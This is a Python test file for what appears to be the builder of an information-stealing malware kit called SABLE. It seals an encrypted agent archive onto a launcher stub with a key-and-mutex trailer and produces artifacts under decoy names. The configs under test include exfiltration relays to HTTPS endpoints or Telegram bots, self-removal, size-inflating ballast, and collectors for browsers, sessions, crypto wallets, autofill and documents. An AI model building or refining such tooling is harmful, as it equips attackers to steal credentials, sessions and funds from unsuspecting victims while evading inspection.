"""The contracts that hold the build together, tested where the halves meet.

Four seams decide whether an artifact runs, and each of them is a place where two
modules have to agree without either importing the other:

1. **Seal and loader.** ``core/seal.py`` writes the blob; ``agent/loader.py`` reads it.
   ``core/`` may not import ``agent/``, so the byte layout is declared twice on
   purpose. This file seals with one and opens with the other, and pins the constants
   equal, so a change to one half without the other is a red test instead of a
   failure discovered on a machine that cannot be debugged.
2. **Forge and loader, again.** The footer offset is written by ``core/forge.py`` and
   parsed by ``agent/loader.py``. The container is built here and read back with the
   loader's own functions, which is the only check that proves the two agree.
3. **Payload and schema.** The archive carries ``core/schema.py`` verbatim and a
   ``cfg.json`` produced by the same ``to_dict`` the agent reads with, so a built
   artifact can never carry a config its own reader would reject.
4. **Pipeline and everything.** One call, six stages, one outcome, and a failed
   rename that keeps the artifact rather than deleting a completed build.

Everything here runs on a temporary directory and touches no user state. The seal
tests need pycryptodome, which is a runtime dependency of the build path; they skip
rather than fail on a box that does not have it, because the import and config tests
must still be runnable there.
"""

from __future__ import annotations

import importlib.util
import io
import json
import os
import sys
import zipfile
from dataclasses import FrozenInstanceError
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parent.parent
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from agent import loader  # noqa: E402
from core import forge, pipeline, rename, seal  # noqa: E402
from core import validate as validate_module  # noqa: E402
from core.schema import (  # noqa: E402
    RELAY_KINDS,
    SOURCE_FIELDS,
    RelayConfig,
    RelayTarget,
    RunConfig,
    SourceConfig,
    from_dict,
)

CRYPTO = importlib.util.find_spec("Crypto") is not None
needs_crypto = pytest.mark.skipif(not CRYPTO, reason="pycryptodome is not installed")

MUTEX = "Global\\SABLE_CONTRACT_MUTEX_9f2c"
SEAL_KEY = "k-3f9a-contract-key"
TELEGRAM = "123456789:AAHdqTcvCH1vGWJxfSeofSAs0K5PALDsaw$42"


def config(**overrides: object) -> RunConfig:
    """A config that passes every rule, with named fields overridden."""
    base: dict[str, object] = {
        "schema_version": 1,
        "mutex": MUTEX,
        "seal_key": SEAL_KEY,
        "relay": RelayConfig(kind="https", endpoint="https://example.invalid/relay"),
        "sources": SourceConfig(),
        "self_remove": False,
        "ballast_mb": 0,
    }
    base.update(overrides)
    return RunConfig(**base)  # type: ignore[arg-type]


@pytest.fixture()
def stub(tmp_path: Path) -> Path:
    path = tmp_path / "launcher.bin"
    path.write_bytes(os.urandom(4096))
    return path


# --- seal and loader: the same bytes, described twice -----------------------


@needs_crypto
def test_seal_and_loader_agree_on_the_layout() -> None:
    plaintext = b"the archive" * 200
    blob = seal.seal(plaintext, SEAL_KEY)

    assert len(blob) == seal.sealed_size(len(plaintext))
    assert len(blob) == len(plaintext) + seal.SALT_SIZE + seal.NONCE_SIZE + seal.TAG_SIZE
    assert loader._open_sealed(blob, SEAL_KEY) == plaintext


def test_seal_constants_are_pinned_to_the_loader() -> None:
    """The duplication is deliberate; drift is not."""
    assert loader.SALT_SIZE == seal.SALT_SIZE
    assert loader.NONCE_SIZE == seal.NONCE_SIZE
    assert loader.TAG_SIZE == seal.TAG_SIZE
    assert loader.KDF_ITERATIONS == seal.KDF_ITERATIONS
    assert loader.FOOTER_MAGIC == forge.FOOTER_MAGIC
    assert loader.FOOTER_SIZE == forge.FOOTER_SIZE
    assert loader.TRAILER_MAGIC == forge.TRAILER_MAGIC
    assert loader.KEY_SLOT == forge.KEY_SLOT
    assert loader.MUTEX_SLOT == forge.MUTEX_SLOT
    assert loader.TRAILER_SIZE == forge.TRAILER_SIZE


def test_the_key_and_mutex_slots_fit_what_validate_accepts() -> None:
    """A form that passes must always produce a trailer forge can write."""
    assert validate_module.MAX_SEAL_KEY_LENGTH == forge.KEY_SLOT
    assert validate_module.MAX_MUTEX_LENGTH * 4 <= loader.MUTEX_SLOT


@needs_crypto
def test_two_seals_of_the_same_bytes_differ() -> None:
    """Fresh salt and nonce every time, so equal payloads are not visibly equal."""
    plaintext = b"identical input"
    first = seal.seal(plaintext, SEAL_KEY)
    second = seal.seal(plaintext, SEAL_KEY)

    assert first != second
    assert first[seal.SALT_SIZE + seal.NONCE_SIZE:][: len(plaintext)] != plaintext


@needs_crypto
def test_wrong_key_and_damaged_blob_both_fail_closed() -> None:
    blob = seal.seal(b"payload", SEAL_KEY)

    with pytest.raises(loader.ArchiveError):
        loader._open_sealed(blob, "not-the-key")

    damaged = bytearray(blob)
    damaged[-1] ^= 0xFF
    with pytest.raises(loader.ArchiveError):
        loader._open_sealed(bytes(damaged), SEAL_KEY)

    # Header with no ciphertext is not a seal, however readable the header is.
    with pytest.raises(loader.ArchiveError):
        loader._open_sealed(blob[: seal.SEALED_OVERHEAD], SEAL_KEY)


@needs_crypto
def test_empty_key_and_empty_plaintext_are_refused() -> None:
    with pytest.raises(seal.SealError):
        seal.seal(b"payload", "")
    with pytest.raises(seal.SealError):
        seal.seal(b"", SEAL_KEY)
    with pytest.raises(seal.SealError):
        seal.sealed_size(-1)


# --- payload ----------------------------------------------------------------


def test_payload_carries_the_whole_agent_tree() -> None:
    data = forge.payload(ROOT, config())
    assert data[:2] == b"PK"

    with zipfile.ZipFile(io.BytesIO(data)) as archive:
        names = archive.namelist()
        assert "agent/entry.py" in names
        assert forge.SCHEMA_MEMBER in names
        assert forge.CONFIG_MEMBER in names
        assert not any("__pycache__" in name for name in names)

        on_disk = {
            path.relative_to(ROOT).as_posix()
            for path in (ROOT / "agent").rglob("*.py")
            if "__pycache__" not in path.parts
        }
        shipped = {name for name in names if name.startswith("agent/")}
        assert shipped == on_disk, "the archive and agent/ disagree"


def test_payload_ships_the_loader_verbatim() -> None:
    """Nothing is patched on the way in; the trailer carries the two secrets."""
    data = forge.payload(ROOT, config())
    with zipfile.ZipFile(io.BytesIO(data)) as archive:
        shipped = archive.read("agent/loader.py")

    assert shipped == (ROOT / "agent" / "loader.py").read_bytes()

    with zipfile.ZipFile(io.BytesIO(data)) as archive:
        text = archive.read("agent/loader.py").decode("utf-8")
    assert MUTEX not in text
    assert SEAL_KEY not in text


def test_payload_copies_the_schema_byte_for_byte() -> None:
    data = forge.payload(ROOT, config())
    with zipfile.ZipFile(io.BytesIO(data)) as archive:
        assert archive.read(forge.SCHEMA_MEMBER) == (ROOT / "core" / "schema.py").read_bytes()


def test_payload_config_is_readable_by_the_schema_it_ships() -> None:
    cfg = config(
        relay=RelayConfig(kind="telegram", endpoint=TELEGRAM),
        sources=SourceConfig(system=False, documents=False),
        self_remove=True,
        ballast_mb=3,
    )
    data = forge.payload(ROOT, cfg)

    with zipfile.ZipFile(io.BytesIO(data)) as archive:
        document = json.loads(archive.read(forge.CONFIG_MEMBER))

    assert from_dict(document) == cfg


def test_trailer_carries_the_key_and_the_mutex_in_fixed_slots() -> None:
    block = forge.trailer(config())
    assert len(block) == forge.TRAILER_SIZE
    assert block[:4] == forge.TRAILER_MAGIC

    key = block[4:4 + forge.KEY_SLOT]
    assert key.rstrip(b"\x00") == SEAL_KEY.encode("utf-8")
    assert len(key) == forge.KEY_SLOT

    mutex = block[4 + forge.KEY_SLOT:]
    assert mutex.rstrip(b"\x00") == MUTEX.encode("utf-8")
    assert len(mutex) == forge.MUTEX_SLOT


def test_trailer_refuses_a_value_that_does_not_fit_its_slot() -> None:
    with pytest.raises(forge.ForgeError):
        forge.trailer(config(seal_key="k" * (forge.KEY_SLOT + 1)))
    with pytest.raises(forge.ForgeError):
        forge.trailer(config(mutex="Global\\" + "m" * forge.MUTEX_SLOT))
    with pytest.raises(forge.ForgeError):
        forge.trailer(config(mutex="Global\\SABLE\x00MUTEX"))


# --- container --------------------------------------------------------------


@needs_crypto
def test_exe_container_offset_and_footer(tmp_path: Path, stub: Path) -> None:
    data = forge.payload(ROOT, config())
    blob = seal.seal(data, SEAL_KEY)
    built = forge.build(config(), blob, tmp_path / "artifact.exe", mode="exe", stub=stub)

    raw = built.read_bytes()
    assert len(raw) == stub.stat().st_size + len(blob) + forge.TRAILER_SIZE + forge.FOOTER_SIZE
    assert raw[: stub.stat().st_size] == stub.read_bytes()

    footer = raw[-forge.FOOTER_SIZE:]
    assert footer[:4] == forge.FOOTER_MAGIC
    assert int.from_bytes(footer[4:], "little") == stub.stat().st_size

    # The trailer sits between the sealed blob and the footer, so the blob ends
    # exactly where the trailer starts.
    trailer_start = len(raw) - forge.FOOTER_SIZE - forge.TRAILER_SIZE
    assert raw[trailer_start:trailer_start + 4] == forge.TRAILER_MAGIC
    assert raw[trailer_start - len(blob):trailer_start] == blob


@needs_crypto
def test_the_trailer_returns_the_values_the_config_was_built_from(
    tmp_path: Path, stub: Path
) -> None:
    data = forge.payload(ROOT, config())
    built = forge.build(
        config(), seal.seal(data, SEAL_KEY), tmp_path / "artifact.exe", mode="exe", stub=stub
    )

    header = loader._read_trailer(built)
    assert header.seal_key == SEAL_KEY
    assert header.mutex == MUTEX
    assert loader._open_sealed(loader._read_sealed(built, loader._archive_offset(built)), header.seal_key) == data


@needs_crypto
def test_two_builds_share_a_launcher_and_keep_their_own_keys(
    tmp_path: Path, stub: Path
) -> None:
    """The whole point of the trailer: one freeze, any artifact."""
    other_key = "k-77bb-second-build"
    other_mutex = "Global\\SABLE_SECOND_MUTEX_4a1e"

    first_cfg = config()
    second_cfg = config(seal_key=other_key, mutex=other_mutex)

    first = forge.build(
        first_cfg,
        seal.seal(forge.payload(ROOT, first_cfg), first_cfg.seal_key),
        tmp_path / "one.exe",
        mode="exe",
        stub=stub,
    )
    second = forge.build(
        second_cfg,
        seal.seal(forge.payload(ROOT, second_cfg), second_cfg.seal_key),
        tmp_path / "two.exe",
        mode="exe",
        stub=stub,
    )

    assert loader._read_trailer(first).mutex == MUTEX
    assert loader._read_trailer(second).mutex == other_mutex
    assert loader._read_trailer(second).seal_key == other_key

    # Neither key opens the other artifact.
    with pytest.raises(loader.ArchiveError):
        loader._open_sealed(
            loader._read_sealed(second, loader._archive_offset(second)),
            loader._read_trailer(first).seal_key,
        )


@needs_crypto
def test_the_loader_reads_back_what_the_forge_wrote(tmp_path: Path, stub: Path) -> None:
    """The whole boot path minus the mutex: footer, seek, decrypt, unzip."""
    data = forge.payload(ROOT, config())
    built = forge.build(
        config(), seal.seal(data, SEAL_KEY), tmp_path / "artifact.exe", mode="exe", stub=stub
    )

    offset = loader._archive_offset(built)
    assert offset == stub.stat().st_size

    sealed = loader._read_sealed(built, offset)
    recovered = loader._open_sealed(sealed, SEAL_KEY)
    assert recovered == data

    with zipfile.ZipFile(io.BytesIO(recovered)) as archive:
        assert "agent/entry.py" in archive.namelist()


@needs_crypto
def test_ballast_moves_the_offset_without_disturbing_the_payload(
    tmp_path: Path, stub: Path
) -> None:
    data = forge.payload(ROOT, config())
    padded = config(ballast_mb=2)
    built = forge.build(
        padded, seal.seal(data, SEAL_KEY), tmp_path / "padded.exe", mode="exe", stub=stub
    )

    mib = 1024 * 1024
    offset = loader._archive_offset(built)
    assert offset == stub.stat().st_size + 2 * mib
    assert forge.expected_offset(stub.stat().st_size, 2) == offset

    assert loader._open_sealed(loader._read_sealed(built, offset), SEAL_KEY) == data


@needs_crypto
def test_script_container_is_runnable_text_and_ignores_ballast(tmp_path: Path) -> None:
    data = forge.payload(ROOT, config())
    blob = seal.seal(data, SEAL_KEY)

    plain = forge.build(config(), blob, tmp_path / "one.py", mode="py")
    padded = forge.build(config(ballast_mb=64), blob, tmp_path / "two.py", mode="py")

    assert plain.stat().st_size == padded.stat().st_size

    text = plain.read_text(encoding="utf-8")
    assert compile(text, str(plain), "exec")
    assert f"SEAL_KEY = {SEAL_KEY!r}" in text
    assert f"MUTEX = {MUTEX!r}" in text
    assert "loader.acquire(MUTEX)" in text
    assert "loader.adopt(" in text
    assert text.startswith("#!/usr/bin/env python3")


@needs_crypto
def test_container_refuses_the_shapes_it_cannot_build(tmp_path: Path, stub: Path) -> None:
    data = forge.payload(ROOT, config())
    blob = seal.seal(data, SEAL_KEY)
    short = b"\x00" * 8

    with pytest.raises(forge.ForgeError):
        forge.build(config(), blob, tmp_path / "wrong.py", mode="exe", stub=stub)

    with pytest.raises(forge.ForgeError):
        forge.build(config(), blob, tmp_path / "no-stub.exe", mode="exe")

    with pytest.raises(forge.ForgeError):
        forge.build(config(), blob, tmp_path / "mode.exe", mode="dll", stub=stub)

    with pytest.raises(forge.ForgeError):
        forge.build(config(), short, tmp_path / "short.exe", mode="exe", stub=stub)

    empty = tmp_path / "empty.bin"
    empty.write_bytes(b"")
    with pytest.raises(forge.ForgeError):
        forge.build(config(), blob, tmp_path / "empty-stub.exe", mode="exe", stub=empty)


@needs_crypto
def test_a_footer_that_is_not_there_is_refused(tmp_path: Path, stub: Path) -> None:
    plain = tmp_path / "not-an-artifact.exe"
    plain.write_bytes(stub.read_bytes())

    with pytest.raises(loader.ArchiveError):
        loader._archive_offset(plain)
    with pytest.raises(loader.ArchiveError):
        loader._read_trailer(plain)

    tiny = tmp_path / "tiny.exe"
    tiny.write_bytes(b"MZ")
    with pytest.raises(loader.ArchiveError):
        loader._archive_offset(tiny)
    with pytest.raises(loader.ArchiveError):
        loader._read_trailer(tiny)


@needs_crypto
def test_a_trailer_that_is_truncated_is_refused(tmp_path: Path, stub: Path) -> None:
    data = forge.payload(ROOT, config())
    built = forge.build(
        config(), seal.seal(data, SEAL_KEY), tmp_path / "artifact.exe", mode="exe", stub=stub
    )
    raw = built.read_bytes()

    # Every length from "no trailer" to "one byte short" is refused, never guessed at.
    for cut in (0, 1, 4, forge.KEY_SLOT, forge.TRAILER_SIZE - 1):
        damaged = tmp_path / f"cut-{cut}.exe"
        damaged.write_bytes(raw[: len(raw) - forge.TRAILER_SIZE - forge.FOOTER_SIZE + cut])
        with pytest.raises(loader.ArchiveError):
            loader._read_trailer(damaged)


@needs_crypto
def test_an_empty_slot_is_refused_rather_than_silently_blank(tmp_path: Path) -> None:
    path = tmp_path / "blank.exe"
    block = forge.TRAILER_MAGIC + b"\x00" * (forge.KEY_SLOT + forge.MUTEX_SLOT)
    path.write_bytes(b"\x00" * 64 + block + forge.FOOTER_MAGIC + (0).to_bytes(8, "little"))

    with pytest.raises(loader.ArchiveError):
        loader._read_trailer(path)


# --- rename -----------------------------------------------------------------


@pytest.mark.parametrize(
    ("raw", "expected"),
    [
        ("report", "report"),
        ("a:b", "a_b"),
        ("  spaced  ", "spaced"),
        ("trailing...", "trailing"),
        ("con", "_con"),
        ("CON.exe", "_CON.exe"),
        ("lpt9.log", "_lpt9.log"),
        ("Q3 summary", "Q3 summary"),
        # Control characters are replaced, not refused: a name that is only control
        # characters still has bytes left after the substitution, and underscores are
        # a legal filename.
        ("\x01\x02", "__"),
    ],
)
def test_sanitize_makes_a_windows_legal_name(raw: str, expected: str) -> None:
    assert rename.sanitize(raw) == expected


@pytest.mark.parametrize("raw", ["", "   ", "...", " . "])
def test_sanitize_refuses_a_name_with_nothing_left(raw: str) -> None:
    with pytest.raises(rename.RenameError):
        rename.sanitize(raw)


def test_sanitize_truncates_to_the_ceiling() -> None:
    cleaned = rename.sanitize("a" * 400)
    assert len(cleaned) == rename.MAX_NAME_LENGTH


@pytest.mark.parametrize("suffix", [".exe", ".py", ".EXE"])
def test_sanitize_suffix_normalises_case(suffix: str) -> None:
    assert rename.sanitize_suffix(suffix) == suffix.lower()


@pytest.mark.parametrize("suffix", ["", "e", "exe", ".a.b", ".exe ", ".e/x", ".e\\x"])
def test_sanitize_suffix_refuses_a_path_or_a_double_extension(suffix: str) -> None:
    with pytest.raises(rename.RenameError):
        rename.sanitize_suffix(suffix)


def test_generate_returns_a_legal_name_with_the_extension() -> None:
    for extension in (".exe", ".py"):
        name = rename.generate(extension)
        assert name.endswith(extension)
        assert rename.sanitize(name) == name
        assert "_" in name


def test_rename_never_overwrites(tmp_path: Path) -> None:
    first = tmp_path / "source.bin"
    first.write_bytes(b"one")
    second = tmp_path / "other.bin"
    second.write_bytes(b"two")

    landed = rename.rename(first, name="report.txt", directory=tmp_path)
    assert landed.name == "report.txt"

    clash = rename.rename(second, name="report.txt", directory=tmp_path)
    assert clash.name == "report_2.txt"
    assert landed.read_bytes() == b"one"
    assert clash.read_bytes() == b"two"


def test_rename_returns_the_same_path_when_the_name_already_matches(tmp_path: Path) -> None:
    source = tmp_path / "report.txt"
    source.write_bytes(b"x")
    assert rename.rename(source, name="report.txt", directory=tmp_path) == source


def test_rename_refuses_a_path_that_is_not_a_file(tmp_path: Path) -> None:
    with pytest.raises(rename.RenameError):
        rename.rename(tmp_path / "absent.bin", name="x.txt", directory=tmp_path)


# --- validate ---------------------------------------------------------------


def test_every_rule_is_declared_exactly_once() -> None:
    assert len(validate_module.RULES) == 6
    assert len(set(validate_module.RULES)) == 6


def test_a_good_form_produces_no_problems() -> None:
    assert validate_module.validate(config(), mode=forge.OUTPUT_PY) == []


def test_an_unknown_relay_kind_is_reported_under_the_endpoint_rule() -> None:
    """The kind and the endpoint are one form row, so they share a rule."""
    problems = validate_module.validate(
        config(relay=RelayConfig(kind="carrier-pigeon", endpoint="https://x.test")),  # type: ignore[arg-type]
        mode=forge.OUTPUT_PY,
    )
    assert len(problems) == 1
    assert problems[0].rule == validate_module.RULE_ENDPOINT
    assert problems[0].path == "relay.kind"


def test_a_well_formed_mirror_adds_no_problem() -> None:
    relay_config = RelayConfig(
        kind="https",
        endpoint="https://example.invalid/relay",
        targets=(RelayTarget(kind="link", endpoint="https://example.invalid/second"),),
    )
    assert validate_module.validate(config(relay=relay_config), mode=forge.OUTPUT_PY) == []


def test_an_empty_mirror_names_its_index() -> None:
    relay_config = RelayConfig(
        kind="https",
        endpoint="https://example.invalid/relay",
        targets=(RelayTarget(kind="https", endpoint="   "),),
    )
    problems = validate_module.validate(config(relay=relay_config), mode=forge.OUTPUT_PY)

    assert [problem.path for problem in problems] == ["relay.targets.0.endpoint"]
    assert "empty" in problems[0].message


def test_a_mirror_that_repeats_the_primary_is_refused() -> None:
    relay_config = RelayConfig(
        kind="https",
        endpoint="https://example.invalid/relay",
        targets=(RelayTarget(kind="https", endpoint="https://example.invalid/relay"),),
    )
    problems = validate_module.validate(config(relay=relay_config), mode=forge.OUTPUT_PY)

    assert [problem.path for problem in problems] == ["relay.targets.0.endpoint"]
    assert "already" in problems[0].message


def test_a_telegram_mirror_is_checked_by_the_telegram_rule() -> None:
    relay_config = RelayConfig(
        kind="https",
        endpoint="https://example.invalid/relay",
        targets=(RelayTarget(kind="telegram", endpoint="not-a-token$42"),),
    )
    problems = validate_module.validate(config(relay=relay_config), mode=forge.OUTPUT_PY)

    assert [problem.path for problem in problems] == ["relay.targets.0.endpoint"]
    assert "token" in problems[0].message
    assert validate_module.blocking(problems)


@pytest.mark.parametrize("kind", RELAY_KINDS)
def test_each_declared_kind_can_pass(kind: str) -> None:
    endpoint = TELEGRAM if kind == "telegram" else "https://example.invalid/relay"
    problems = validate_module.validate(
        config(relay=RelayConfig(kind=kind, endpoint=endpoint)),  # type: ignore[arg-type]
        mode=forge.OUTPUT_PY,
    )
    assert problems == []


@pytest.mark.parametrize(
    "endpoint",
    [
        "",
        "   ",
        "https://example.invalid/relay ",
        "ftp://example.invalid",
        "https://",
        "not a url",
        "example.invalid/relay",
    ],
)
def test_a_bad_https_endpoint_is_blocking(endpoint: str) -> None:
    problems = validate_module.validate(
        config(relay=RelayConfig(kind="https", endpoint=endpoint)), mode=forge.OUTPUT_PY
    )
    assert problems
    assert all(problem.path == "relay.endpoint" for problem in problems)
    assert validate_module.blocking(problems)


@pytest.mark.parametrize(
    "endpoint",
    ["", "token-only", "$42", "123:short$42", "123456789:AAHdqTcvCH1vGWJxfSeofSAs0K5PALDsaw", "a$b$c"],
)
def test_a_bad_telegram_endpoint_is_blocking(endpoint: str) -> None:
    problems = validate_module.validate(
        config(relay=RelayConfig(kind="telegram", endpoint=endpoint)), mode=forge.OUTPUT_PY
    )
    assert validate_module.blocking(problems)


def test_all_sources_off_is_blocking() -> None:
    problems = validate_module.validate(
        config(sources=SourceConfig(**{name: False for name in SOURCE_FIELDS})),
        mode=forge.OUTPUT_PY,
    )
    assert [problem.path for problem in problems] == ["sources"]
    assert validate_module.blocking(problems)


def test_ballast_on_a_script_is_a_note_not_a_stop() -> None:
    problems = validate_module.validate(config(ballast_mb=8), mode=forge.OUTPUT_PY)
    assert [problem.path for problem in problems] == ["ballast_mb"]
    assert problems[0].blocking is False
    assert validate_module.blocking(problems) == []


def test_seal_key_below_the_floor_is_blocking() -> None:
    problems = validate_module.validate(config(seal_key="short"), mode=forge.OUTPUT_PY)
    assert [problem.path for problem in problems] == ["seal_key"]
    assert problems[0].blocking is True


def test_seal_key_over_the_slot_is_blocking() -> None:
    """A key the trailer cannot carry must fail on the form, not at the write stage."""
    problems = validate_module.validate(
        config(seal_key="k" * (validate_module.MAX_SEAL_KEY_LENGTH + 1)), mode=forge.OUTPUT_PY
    )
    assert [problem.path for problem in problems] == ["seal_key"]
    assert str(validate_module.MAX_SEAL_KEY_LENGTH) in problems[0].message


def test_a_key_at_the_byte_ceiling_passes() -> None:
    exact = "k" * forge.KEY_SLOT
    assert validate_module.validate(config(seal_key=exact), mode=forge.OUTPUT_PY) == []


def test_a_name_without_an_extension_is_a_note() -> None:
    problems = validate_module.validate(config(), mode=forge.OUTPUT_PY, name="quarterly")
    assert [problem.path for problem in problems] == ["output.name"]
    assert problems[0].blocking is False


def test_a_name_with_the_wrong_extension_is_blocking() -> None:
    problems = validate_module.validate(config(), mode=forge.OUTPUT_PY, name="quarterly.exe")
    assert [problem.path for problem in problems] == ["output.name"]
    assert validate_module.blocking(problems)


def test_exe_mode_needs_a_launcher() -> None:
    problems = validate_module.validate(config(), mode=forge.OUTPUT_EXE)
    assert [problem.path for problem in problems] == ["output.stub"]
    assert validate_module.blocking(problems)


def test_an_unknown_mode_short_circuits_the_mode_rules() -> None:
    problems = validate_module.validate(config(ballast_mb=999_999), mode="dll", name="nope.exe")
    assert [problem.path for problem in problems] == ["output.mode"]


def test_describe_is_capped_and_says_how_many_more() -> None:
    problems = [
        validate_module.Problem(rule="x", path=f"f{index}", message="bad") for index in range(9)
    ]
    line = validate_module.describe(problems, limit=3)
    assert line.count(";") == 3
    assert "and 6 more" in line


def test_describe_of_nothing_is_empty() -> None:
    assert validate_module.describe([]) == ""


def test_validate_never_raises_even_on_a_broken_config() -> None:
    """The contract is 'returns problems'. A caller must not have to guard the guard."""

    class Wrong:
        pass

    problems = validate_module.validate(Wrong(), mode=forge.OUTPUT_PY)  # type: ignore[arg-type]
    assert problems
    assert problems[0].rule == validate_module.RULE_INTERNAL


# --- pipeline ---------------------------------------------------------------


@needs_crypto
def test_run_produces_one_named_artifact(tmp_path: Path) -> None:
    out = tmp_path / "out"
    outcome = pipeline.run(
        config(), root=ROOT, out_dir=out, mode=forge.OUTPUT_PY, name="quarterly"
    )

    assert outcome.mode == forge.OUTPUT_PY
    assert outcome.artifact == out / "quarterly.py"
    assert outcome.artifact.is_file()
    assert outcome.size == outcome.artifact.stat().st_size
    assert outcome.seconds >= 0.0
    assert compile(outcome.artifact.read_text(encoding="utf-8"), "artifact", "exec")


@needs_crypto
def test_run_generates_a_name_and_creates_a_missing_directory(tmp_path: Path) -> None:
    out = tmp_path / "deep" / "nested" / "out"
    outcome = pipeline.run(config(), root=ROOT, out_dir=out, mode=forge.OUTPUT_PY)

    assert outcome.artifact.parent == out
    assert outcome.artifact.suffix == ".py"
    assert rename.sanitize(outcome.artifact.name) == outcome.artifact.name


@needs_crypto
def test_run_reports_every_stage_once_and_in_order(tmp_path: Path) -> None:
    seen: list[tuple[str, float]] = []
    pipeline.run(
        config(),
        root=ROOT,
        out_dir=tmp_path / "out",
        mode=forge.OUTPUT_PY,
        progress=lambda event: seen.append((event.stage, event.fraction)),
    )

    stages = [stage for stage, _ in seen]
    assert stages[0] == pipeline.STAGE_VALIDATE
    assert stages[-1] == pipeline.STAGE_DONE
    assert set(stages) == set(pipeline.STAGES)

    fractions = [fraction for _, fraction in seen]
    assert fractions == sorted(fractions)
    assert fractions[0] == 0.0
    assert fractions[-1] == 1.0


@needs_crypto
def test_a_progress_callback_that_raises_does_not_take_the_build_with_it(
    tmp_path: Path,
) -> None:
    def hostile(event: pipeline.Event) -> None:
        raise RuntimeError("the UI died")

    outcome = pipeline.run(
        config(), root=ROOT, out_dir=tmp_path / "out", mode=forge.OUTPUT_PY, progress=hostile
    )
    assert outcome.artifact.is_file()


@needs_crypto
def test_an_invalid_form_carries_every_problem(tmp_path: Path) -> None:
    broken = config(seal_key="", relay=RelayConfig(kind="https", endpoint=""))

    with pytest.raises(pipeline.ValidationFailed) as caught:
        pipeline.run(broken, root=ROOT, out_dir=tmp_path / "out", mode=forge.OUTPUT_PY)

    paths = {problem.path for problem in caught.value.problems}
    assert {"seal_key", "relay.endpoint"} <= paths
    assert caught.value.stage == pipeline.STAGE_VALIDATE
    assert not (tmp_path / "out").exists(), "nothing is written before the form passes"


@needs_crypto
def test_cancellation_stops_between_stages(tmp_path: Path) -> None:
    with pytest.raises(pipeline.PipelineCancelled) as caught:
        pipeline.run(
            config(),
            root=ROOT,
            out_dir=tmp_path / "out",
            mode=forge.OUTPUT_PY,
            cancel=lambda: True,
        )
    assert caught.value.stage == pipeline.STAGE_VALIDATE
    assert not (tmp_path / "out").exists()


@needs_crypto
def test_a_cancelled_build_does_not_leave_a_working_file(tmp_path: Path) -> None:
    """A build stopped after forging is removed, not left under a random name.

    The working name is random, so nothing ever revisits it: a cancel that leaks one
    leaves a full-size artifact in the output folder that the next run cannot see.
    """
    calls = {"n": 0}

    def cancel() -> bool:
        calls["n"] += 1
        return calls["n"] > 4

    out = tmp_path / "out"
    with pytest.raises(pipeline.PipelineCancelled) as caught:
        pipeline.run(
            config(), root=ROOT, out_dir=out, mode=forge.OUTPUT_PY, cancel=cancel
        )

    assert caught.value.stage == pipeline.STAGE_RENAME
    assert list(out.glob("sable-build-*")) == [], "the working artifact was left behind"


@needs_crypto
def test_a_failed_rename_keeps_the_artifact(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """A build that finished is not thrown away because the name was rejected."""

    def refuse(*args: object, **kwargs: object) -> Path:
        raise rename.RenameError("report.txt: the name is taken")

    monkeypatch.setattr(pipeline.rename, "rename", refuse)

    with pytest.raises(pipeline.PipelineError) as caught:
        pipeline.run(config(), root=ROOT, out_dir=tmp_path / "out", mode=forge.OUTPUT_PY)

    assert isinstance(caught.value, pipeline.PipelineError)
    assert not isinstance(caught.value, pipeline.ValidationFailed)
    assert caught.value.stage == pipeline.STAGE_RENAME
    assert caught.value.artifact is not None
    assert caught.value.artifact.is_file()
    assert caught.value.artifact.name.startswith("sable-build-")


@needs_crypto
def test_two_runs_into_the_same_directory_do_not_collide(tmp_path: Path) -> None:
    out = tmp_path / "out"
    first = pipeline.run(config(), root=ROOT, out_dir=out, mode=forge.OUTPUT_PY, name="same")
    second = pipeline.run(config(), root=ROOT, out_dir=out, mode=forge.OUTPUT_PY, name="same")

    assert first.artifact != second.artifact
    assert first.artifact.is_file() and second.artifact.is_file()


def test_outcome_and_event_are_frozen() -> None:
    event = pipeline.Event(stage="seal", message="sealing", fraction=0.5)
    with pytest.raises(FrozenInstanceError):
        event.stage = "forge"  # type: ignore[misc]

    outcome = pipeline.Outcome(artifact=Path("x.py"), mode="py", size=1, seconds=0.1)
    with pytest.raises(FrozenInstanceError):
        outcome.size = 2  # type: ignore[misc]


# --- collector isolation ----------------------------------------------------


def registry_config() -> object:
    from types import SimpleNamespace

    flags = dict.fromkeys(
        ("system", "browsers", "sessions", "wallets", "autofill", "documents"), True
    )
    return SimpleNamespace(sources=SimpleNamespace(**flags))


def test_a_raising_collector_is_named_and_the_rest_still_run(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    from types import SimpleNamespace

    import agent.sources as registry

    class Refused(Exception):
        pass

    def explode(*_: object, **__: object) -> int:
        raise Refused("store refused to open")

    def work(*_: object, **__: object) -> int:
        return 5

    def fake_import(name: str, package: str | None = None) -> object:
        if name.endswith(".browsers"):
            return SimpleNamespace(run=explode)
        return SimpleNamespace(run=work)

    monkeypatch.setattr(registry.importlib, "import_module", fake_import)

    counts, failures = registry.run_all(tmp_path, registry_config())

    assert failures == {"browsers": "Refused: store refused to open"}
    assert counts["browsers"] == 0
    assert counts["sessions"] == 5, "a broken neighbour must not stop the next collector"



def test_a_clean_run_reports_no_failures(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    from types import SimpleNamespace

    import agent.sources as registry

    monkeypatch.setattr(
        registry.importlib,
        "import_module",
        lambda name, package=None: SimpleNamespace(run=lambda *a, **k: 1),
    )

    counts, failures = registry.run_all(tmp_path, registry_config())

    assert failures == {}
    assert set(counts) == {
        "system",
        "network",
        "displays",
        "browsers",
        "sessions",
        "wallets",
        "autofill",
        "documents",
    }
